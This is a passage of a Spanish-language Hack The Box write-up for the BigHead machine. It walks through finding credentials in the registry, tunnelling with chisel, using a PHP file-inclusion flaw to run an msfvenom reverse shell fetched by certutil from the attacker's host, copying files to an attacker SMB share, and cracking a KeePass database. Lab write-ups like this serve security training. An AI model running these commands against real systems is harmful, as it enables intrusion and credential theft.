+<code><span class="p">PS C:\Users\Nelson\Desktop> </span><span class="am">Get-Process</span><span class="p">
+
+Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
+-------  ------    -----      ----- -----   ------     -- -----------
+     74       4     1740       4580    54     0.02   3504 BigheadWebSvr
+    118       7     4276      13140    88            1724 BssCtrl
+    171       9     4472      12100    86            1632 BvSshServer
+     20       1     2472       2604    23     0.11   1328 cmd
+    251       7     5504       7632   107             520 csrss
+    251       8     5972      12748    74            2968 dllhost
+.......................................................................  
+
+PS C:\Users\Nelson\Desktop> </span><span class="am">netstat </span><span class="c1">-nat</span><span class="p">
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           Offload State
+
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:2020           0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:8018           0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:8028           0.0.0.0:0              LISTENING       InHost      
+....................................................................................  
+
+PS C:\Users\Nelson\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">reg</code> podemos enumerar recursivamente registros <code class="language-plaintext highlighter-rouge">HKLM</code> que contengan la string <code class="language-plaintext highlighter-rouge">password</code>, varios de los registros que encontramos pertenecen a <code class="language-plaintext highlighter-rouge">nginx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Nelson\Desktop> </span><span class="am">reg </span><span class="p">query HKLM /f password /t REG_SZ /s
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Classes\kdbxfile\shell\open
+    (Default)    REG_SZ    &Open with KeePass Password Safe
+
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx
+    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a  
+
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\nginx
+    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a  
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx
+    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a  
+
+End of search: 47 match(es) found.
+
+PS C:\Users\Nelson\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El valor <code class="language-plaintext highlighter-rouge">PasswordHash</code> de estos registros parece ser una cadena en <code class="language-plaintext highlighter-rouge">hexadecimal</code>, podemos decodearla usando <code class="language-plaintext highlighter-rouge">xxd</code> en bash pero el resultado no nos aporta nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="p">336d72676e6333205361797a205472794861726465722e2e2e203b440a | </span><span class="ve">xxd</span><span class="p"> -ps -r  
+3mrgnc3 Sayz TryHarder... ;D</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando la key podemos encontrar un valor <code class="language-plaintext highlighter-rouge">Authenticate</code> que parece hexadecimal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Nelson\Desktop> </span><span class="am">reg </span><span class="p">query HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx
+
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x2
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    C:\Program Files\nssm\win32\nssm.exe
+    DisplayName    REG_SZ    Nginx
+    ObjectName    REG_SZ    .\nginx
+    Description    REG_SZ    Nginx web server and proxy.
+    DelayedAutostart    REG_DWORD    0x0
+    FailureActionsOnNonCrashFailures    REG_DWORD    0x1
+    FailureActions    REG_BINARY    00000000000000000000000003000000140000000100000060EA00000100000060EA00000100000060EA0000
+    Authenticate    REG_BINARY    4800370033004200700055005900320055007100390055002D005900750067007900740035004600590055006200590030002D0055003800370074003800370000000000  
+    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a
+
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx\Enum
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx\Parameters
+
+PS C:\Users\Nelson\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al decodear esta cadena encontramos algo que parece ser una <code class="language-plaintext highlighter-rouge">contraseña</code>, tal vez podriamos usarla como usuario nginx para <code class="language-plaintext highlighter-rouge">BvSshServer</code> en el puerto 2020</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="p">4800370033004200700055005900320055007100390055002D005900750067007900740035004600590055006200590030002D0055003800370074003800370000000000 | </span><span class="ve">xxd</span><span class="p"> -ps -r  
+H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como desde fuera no tenemos acceso crearemos un <code class="language-plaintext highlighter-rouge">proxy</code> tipo socks con <code class="language-plaintext highlighter-rouge">chisel</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\chisel.exe </span><span class="p">client 10.10.14.10:9999 R:socks  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999
+server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora pasando por el proxy con <code class="language-plaintext highlighter-rouge">proxychains</code> podemos conectarnos al puerto 2020 con <code class="language-plaintext highlighter-rouge">ssh</code> como el usuario <code class="language-plaintext highlighter-rouge">nginx</code> y la contraseña que obtuvimos de la cadena en hex</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q ssh nginx@bighead.htb -p 2020
+nginx@bighead.htb's password: H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87  
+</span><span class="ve">bvshell</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Aunque tenemos acceso a una <code class="language-plaintext highlighter-rouge">bvshell</code> bastante restringida podemos ver varios archivos interesantes que parecen ser el <code class="language-plaintext highlighter-rouge">codigo fuente</code> de algun servidor web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">bvshell</span><span class="p">:</span><span class="az">/apps/testlink/htdocs</span><span class="p">$ ls -l
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER        601 2018-04-14  08:07 BUYING_SUPPORT.TXT
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:53 </span><span class="az">cfg</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER     306612 2018-04-14  09:05 CHANGELOG
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER        558 2018-04-14  08:07 CODE_REUSE
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      78934 2018-06-24  18:53 config.inc.php
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER        183 2018-06-24  18:53 config_db.inc.php
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:52 </span><span class="az">custom</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      12230 2018-04-14  08:07 custom_config.inc.php.example
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       1038 2018-04-14  08:07 custom_config.inc.php.example.github_oauth  
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:53 </span><span class="az">docs</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       1112 2018-04-14  08:07 error.php
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:52 </span><span class="az">extra</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       5546 2018-04-14  08:07 firstLogin.php
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:52 </span><span class="az">gui</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       3145 2018-04-14  08:07 index.php
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:53 </span><span class="az">lib</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      18009 2018-04-14  08:07 LICENSE
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      12857 2018-09-02  17:41 linkto.php
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       8056 2018-04-14  08:07 lnl.php
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:52 </span><span class="az">locale</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      10853 2018-04-14  08:07 login.php
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       1223 2018-04-14  08:07 logout.php  
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  19:00 </span><span class="az">logs</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER        218 2018-07-08  14:10 note.txt 
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER       1206 2018-04-14  08:07 plugin.php  
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-09-02  15:53 </span><span class="az">plugins</span><span class="p">
+-rw-rw----   1 Administrators@BUILTIN None@PIEDPIPER      13020 2018-04-14  08:07 refactor.txt
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:52 </span><span class="az">third_party</span><span class="p">
+drwxrwx---   1 Administrators@BUILTIN None@PIEDPIPER          0 2018-06-24  18:52 </span><span class="az">upload_area</span><span class="p">
+</span><span class="ve">bvshell</span><span class="p">:</span><span class="az">/apps/testlink/htdocs</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entre los archivos existentes hay un archivo <code class="language-plaintext highlighter-rouge">note.txt</code> donde pide a un usuario que se centre en su subdominio <code class="language-plaintext highlighter-rouge">dev</code> y deje en su <code class="language-plaintext highlighter-rouge">code</code> ya que este ha roto la aplicacion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">bvshell</span><span class="p">:</span><span class="az">/apps/testlink/htdocs</span><span class="p">$ cat note.txt
+BIGHEAD! You F%*#ing R*#@*d!
+
+STAY IN YOUR OWN DEV SUB!!!...
+
+You have literally broken the code testing app and tools I spent all night building for Richard!  
+
+I don't want to see you in my code again!
+
+Dinesh.
+</span><span class="ve">bvshell</span><span class="p">:</span><span class="az">/apps/testlink/htdocs</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto es de gran ayuda ya que deducimos que este es el codigo del subdominio <code class="language-plaintext highlighter-rouge">code</code>, si intentamos cargar un archivo como <code class="language-plaintext highlighter-rouge">linkto.php</code> este existe en el subdominio</p>
+<a href="/htb/bighead/7.png" target="_blank"><div><p><img src="/htb/bighead/7.png"></p></div></a>
+
+<p class="plain-text">Justo en el archivo <code class="language-plaintext highlighter-rouge">linkto.php</code> encontramos una vulnerabilidad y es que ejecuta la funcion <code class="language-plaintext highlighter-rouge">require_once</code> pasandole como argumento lo que recibe por <code class="language-plaintext highlighter-rouge">POST</code> a traves del parametro <code class="language-plaintext highlighter-rouge">PiperCoinID</code> por lo que podemos cargar un <code class="language-plaintext highlighter-rouge">php</code> malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">// alpha 0.0.1 implementation of our new pipercoin authentication tech
+// full API not done yet. just submit tokens with requests for now.
+</span><span class="o">if</span><span class="p">(</span><span class="o">isset</span><span class="p">($_POST[</span><span class="s">'PiperID'</span><span class="p">])){$PiperCoinAuth </span><span class="o">= </span><span class="p">$_POST[</span><span class="s">'PiperCoinID'</span><span class="p">];</span><span class="c1"> //plugins/ppiper/pipercoin.php  </span><span class="p">
+        $PiperCoinSess </span><span class="o">= </span><span class="no">base64_decode</span><span class="p">($PiperCoinAuth);
+        $PiperCoinAvitar </span><span class="o">= </span><span class="p">(</span><span class="no">string</span><span class="p">)$PiperCoinSess;}
+
+</span><span class="c1">// some session and settings stuff from original index.php
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'lib/functions/configCheck.php'</span><span class="p">);
+checkConfiguration();
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'config.inc.php'</span><span class="p">);
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'common.php'</span><span class="p">);
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'attachments.inc.php'</span><span class="p">);
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'requirements.inc.php'</span><span class="p">);
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'testcase.class.php'</span><span class="p">);
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'testproject.class.php'</span><span class="p">);
+</span><span class="o">require_once</span><span class="p">(</span><span class="s">'users.inc.php'</span><span class="p">);
+</span><span class="o">require_once</span><span class="p">($PiperCoinAuth);
+testlinkInitPage($db, </span><span class="mi">true</span><span class="p">);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos por crear un archivo llamado <code class="language-plaintext highlighter-rouge">shell.exe</code> malicioso con msfvenom que nos envie una shell y otro <code class="language-plaintext highlighter-rouge">shell.php</code> que simplemente ejecute ese exe con cmd</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1806 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ cat </span><span class="p">shell.php
+&lt?php
+    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd /c C:\ProgramData\shell.exe"</span><span class="p">);
+?></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como no tenemos <code class="language-plaintext highlighter-rouge">curl</code> en el equipo podemos descargar ambos archivos en cualquier directorio que tenga permisos de escritura en el windows usando <code class="language-plaintext highlighter-rouge">certutil</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">certutil </span><span class="c1">-f -urlcache -split </span><span class="p">http://10.10.14.10/shell.exe shell.exe  
+PS C:\ProgramData> </span><span class="am">certutil </span><span class="c1">-f -urlcache -split </span><span class="p">http://10.10.14.10/shell.php shell.php  
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Solo nos queda hacer una petición a el <code class="language-plaintext highlighter-rouge">linkto.php</code> pasandole en el parametro <code class="language-plaintext highlighter-rouge">PiperID</code> cualquier cosa y en <code class="language-plaintext highlighter-rouge">PiperCoinID</code> la ruta del php malicioso que subimos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">http://code.bighead.htb/testlink/linkto.php -d </span><span class="am">"PiperID=1&PiperCoinID=C:\ProgramData\shell.php"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo ejecutara el <code class="language-plaintext highlighter-rouge">php</code> que a su vez ejecutara el <code class="language-plaintext highlighter-rouge">exe</code> y este nos enviara una powershell como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> que tiene maximos privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo </span><span class="p">netcat -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.112
+Windows PowerShell running as user PIEDPIPER$ on PIEDPIPER  
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\xampp\apps\testlink\htdocs> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\xampp\apps\testlink\htdocs></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto podemos leer la flag <code class="language-plaintext highlighter-rouge">user.txt</code> en el escritorio del usuario <code class="language-plaintext highlighter-rouge">nginx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nginx\Desktop> </span><span class="am">type </span><span class="p">user.txt  
+5f1**************************bc3
+PS C:\Users\nginx\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque de primeras no logramos ver el archivo <code class="language-plaintext highlighter-rouge">root.txt</code> ya que esta oculto usando el parametro <code class="language-plaintext highlighter-rouge">-force</code> nos lo muestra sin embargo este tampoco contiene la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Desktop> </span><span class="am">dir</span><span class="c1"> -force</span><span class="p">
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---        06/10/2018     15:38        697 chest.lnk
+-a---        02/07/2018     12:56    3579384 hardentools.exe
+-a---        05/07/2018     18:23        971 Immunity Debugger.lnk  
+-arh-        06/10/2018     15:33       1519 root.txt
+
+PS C:\Users\Administrator\Desktop> </span><span class="am">type </span><span class="p">root.txt  
+
+                    * * *
+
+              Gilfoyle's Prayer
+     
+___________________6666666___________________ 
+____________66666__________66666_____________ 
+_________6666___________________666__________ 
+_______666__6____________________6_666_______ 
+_____666_____66_______________666____66______ 
+____66_______66666_________66666______666____ 
+___66_________6___66_____66___66_______666___ 
+__66__________66____6666_____66_________666__ 
+_666___________66__666_66___66___________66__ 
+_66____________6666_______6666___________666_ 
+_66___________6666_________6666__________666_ 
+_66________666_________________666_______666_ 
+_66_____666______66_______66______666____666_ 
+_666__666666666666666666666666666666666__66__ 
+__66_______________6____66______________666__ 
+___66______________66___66_____________666___ 
+____66______________6__66_____________666____ 
+_______666___________666___________666_______ 
+_________6666_________6_________666__________ 
+____________66666_____6____66666_____________ 
+___________________6666666________________
+
+   Prayer for The Praise of Satan's Kingdom
+
+              Praise, Hail Satan!
+   Glory be to Satan the Father of the Earth
+       and to Lucifer our guiding light
+    and to Belial who walks between worlds
+     and to Lilith the queen of the night
+    As it was in the void of the beginning
+                   Is now, 
+and ever shall be, Satan's kingdom without End
+
+                so it is done.
+
+                    * * *
+
+PS C:\Users\Administrator\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes en los registros habiamos visto uno relacionado a <code class="language-plaintext highlighter-rouge">keepass</code>, buscando encontramos que el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> tiene un archivo de configuracion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\AppData\Roaming\KeePass> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\Administrator\AppData\Roaming\KeePass
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---        06/10/2018     23:08       4700 KeePass.config.xml  
+
+PS C:\Users\Administrator\AppData\Roaming\KeePass></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este podemos ver que </code class="language-plaintext highlighter-rouge">DatabasePath</code> esta seteado al <code class="language-plaintext highlighter-rouge">Zone.Identifier</code> del <code class="language-plaintext highlighter-rouge">root.txt</code> y </code class="language-plaintext highlighter-rouge">KeyFilePath</code> esta seteado al archivo <code class="language-plaintext highlighter-rouge">admin.png</code> del directorio Pictures</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">&ltKeySources>
+	&ltAssociation>
+		&ltDatabasePath>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier&lt/DatabasePath>  
+		&ltPassword>true&lt/Password>
+		&ltKeyFilePath>..\..\Users\Administrator\Pictures\admin.png&lt/KeyFilePath>
+	&lt/Association>
+&lt/KeySources></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para tranferirlos podemos montar un servidor <code class="language-plaintext highlighter-rouge">smb</code> y simplemente copiar los archivos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Desktop> </span><span class="am">cp </span><span class="p">root.txt \\10.10.14.10\kali\root.txt  
+PS C:\Users\Administrator\Desktop> </span><span class="am">cp </span><span class="p">..\Pictures\admin.png \\10.10.14.10\kali\admin.png  
+PS C:\Users\Administrator\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que el <code class="language-plaintext highlighter-rouge">Zone.Identifier</code> es una db de keepass asi que lo renombramos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ file </span><span class="p">root.txt:Zone.Identifier
+root.txt:Zone.Identifier: Keepass password database 2.x KDBX  
+
+</span><span class="ve">❯ mv </span><span class="p">root.txt:Zone.Identifier file.kdbx</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">admin.png</code> como key podemos crear un hash con <code class="language-plaintext highlighter-rouge">keepass2john</code> y crackearlo a traves de fuerza bruta con <code class="language-plaintext highlighter-rouge">john</code> para asi ver su contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ keepass2john </span><span class="p">-k admin.png file.kdbx > hash
+
+</span><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash  
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">darkness</span><span class="p">         (</span><span class="am">file</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente podemos desbloquear el archivo <code class="language-plaintext highlighter-rouge">kdbx</code> usando como key el archivo <code class="language-plaintext highlighter-rouge">admin.png</code> y la contraseña que gracias a crackearla sabemos que es <code class="language-plaintext highlighter-rouge">darkness</code></p>
+<a href="/htb/bighead/5.png" target="_blank"><div><p><img src="/htb/bighead/5.png"></p></div></a>
+
+<p class="plain-text">Al desbloquearlo podemos ver una credencial llamada <code class="language-plaintext highlighter-rouge">root.txt</code> que tiene la flag</p>
+<a href="/htb/bighead/6.png" target="_blank"><div><p><img src="/htb/bighead/6.png"></p></div></a>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
